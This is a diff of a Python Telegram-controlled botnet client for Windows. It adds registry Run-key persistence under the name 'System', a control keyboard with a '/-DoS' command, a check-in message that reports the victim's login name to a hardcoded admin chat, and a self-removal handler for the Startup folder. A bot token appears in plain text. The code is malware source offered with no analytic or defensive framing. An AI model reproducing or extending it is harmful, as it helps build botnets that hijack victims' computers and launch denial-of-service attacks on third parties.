@@ -1,10 +1,24 @@
 import telebot, os, time
+from telebot import types
 from ctypes import *
 from ctypes.wintypes import *
 import shutil
 import threading
 import socket 
 import sys,random
+from winreg import *
+
+#from telebot import apihelper
+
+#apihelper.proxy = {'https': 'socks5h://geek:socks@t.geekclass.ru:7777'}
+
+def regedit():
+ key_my = OpenKey(HKEY_CURRENT_USER, 
+                 r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+                 0, KEY_ALL_ACCESS)
+ SetValueEx(key_my, 'System', 0, REG_SZ, os.path.basename(__file__))
+ # Закрыть реестр
+ CloseKey(key_my)
 
 
 
@@ -21,10 +35,34 @@ token = '5013623825:AAERJ6ABD7YoUDc5UwQBnZxK6QdUrE03Md0'
 adm = '666015577'
 bot = telebot.TeleBot(token)
 
+menu = types.ReplyKeyboardMarkup()
+button = types.KeyboardButton('/-DoS\n⭕️')
+button2 = types.KeyboardButton('/Stop\n')
+button3 = types.KeyboardButton('/Check\n')
+button4 = types.KeyboardButton('/Delete\n')
+menu.row(button, button3)
+menu.row(button4, button2)
+
+try:
+ bot.send_message(adm, 
+ os.getlogin() + ' oнлайн!',
+ reply_markup=menu)
+except:
+ time.sleep(60)
+ os.startfile(sys.argv[0])
+
 
 @bot.message_handler(commands=['Check'])
 def check(message):
   bot.send_message(adm, os.getlogin() + ' готов к работе!')
+
+@bot.message_handler(commands=['Delete'])
+def check(message):
+  os.system(r'attrib -h "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"'+os.path.basename(__file__))
+  os.remove('C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(__file__))
+  #bot.send_message(adm, 'Удалён!')
+  bot.send_message(adm, 'Удалён!')
+  sys.exit()
 
 
 @bot.message_handler(commands=['Stop'])
